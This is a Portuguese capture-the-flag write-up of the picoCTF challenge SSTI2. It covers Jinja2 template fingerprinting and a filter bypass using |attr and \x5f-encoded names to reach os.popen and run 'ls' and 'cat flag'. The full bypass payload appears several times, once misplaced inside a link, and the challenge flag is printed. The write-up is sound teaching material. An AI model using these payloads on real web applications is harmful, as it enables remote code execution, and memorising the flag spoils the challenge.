# SSTI2
###### Solved by @joaoselim
> This CTF is about web, SSTI

## About the challenge
A questão [SSTI2]({{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
) possui o enunciado `I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)` junto de um link gerado para o site.

Explica que tem um site onde é possível anunciar qualquer coisa, mas que diferente do desfaio [SSTI1](https://play.picoctf.org/practice/challenge/492?page=1&search=SSTI) agora tem um filtro que bloqueia certas entradas.

## Solution
Ao abrir o site encontra-se uma página simples com texto e um espaço para inserir informação.

[![tela-inicial.png](https://i.postimg.cc/nrSb2tJ9/tela-inicial.png)](https://postimg.cc/jnfFqmCR)

O nome da questão é uma informação de que o desafio é baseado em [SSTI(Server Side Template Injection)](https://portswigger.net/web-security/server-side-template-injection#what-is-server-side-template-injection),
que se trata de injeção de código nos templates.

O primeiro passo é identificar qual o tipo de template que estamos lidando; para determinar isso existem textes, como exemplificado na árvore de decisões.

[![template-decision-tree.png](https://i.postimg.cc/66bpzkzh/template-decision-tree.png)](https://postimg.cc/yW9K8rMJ)

O primeiro payload a verificar é `${7*7}`. Inserindo tem como saída:

[![input1.png](https://i.postimg.cc/xC01FYW6/input1.png)](https://postimg.cc/NyztKhGX)

Não funcionou, para ter sucesso, o programa simplesmente leu como um texto comum, e não executou o programa.

Seguindo a tabela, o próximo payload a ser inserido é `{{7*7}}`. Inserindo se tem como saída.

[![input2.png](https://i.postimg.cc/J0YgCcts/input2.png)](https://postimg.cc/QK5Sp7QD)

Dessa vez o programa foi executado, foi interpretado que deveria realizar a multiplicação de `7 * 7` retornando `49`.

O próximo payload teste a ser inserido é `{{7*'7'}}`. Inserindo se tem como saída.

[![input3.png](https://i.postimg.cc/rmqd45jZ/input3.png)](https://postimg.cc/t1mCQZLF)

Com isso é possível se constatar que se trata de [Jinja2](https://www.treinaweb.com.br/blog/o-que-e-o-jinja2).

A partir desse ponto se consiste em entender como funciona a filtragem e elaborar de um payload que seja aceito pelo site.
Verificando o código fonte do site e analisando, entende-se que não tem como ter acesso direto ao filtro. Portanto a maneira de seguir é inserindo payloads e observar oque é aceito ou não.

Inserindo payloads como:
```
{{ self._init.globals.builtins.import_('os').popen('id').read() }}
```
```
{{config._class.init.globals_['os'].popen('ls').read()}}
```
É observável que algumas das strings filtradas incluem `.`, `'os'`, `[]` e a remoção do caracter `_`.

[![inputfalho.png](https://i.postimg.cc/XJJTJ7mG/inputfalho.png)](https://postimg.cc/WDB9Yj2T)

Para driblar o filtro, codificamos os caracteres necessários para o código. Substituindo `.` por `\x5f` e `_` por `|attr`, se resulta no payload:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```
Inserindo ele, retorna a informação de arquivos localizados na pasta atual

[![inputls.png](https://i.postimg.cc/3RkYqBKc/inputls.png)](https://postimg.cc/47RD7pH6)

Com essa saída constatou-se a existência de um arquivo `flag`.

Agora precisa se acessar o conteúdo do arquivo, através do comando `cat` e indicando o arquivo em questão, se gera o payload:
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
Inserindo, obtem-se a saída:

[![inputflag.png](https://i.postimg.cc/PqhC00cF/inputflag.png)](https://postimg.cc/SnTQM1mW)

Assim chegando na flag:
>'picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}'
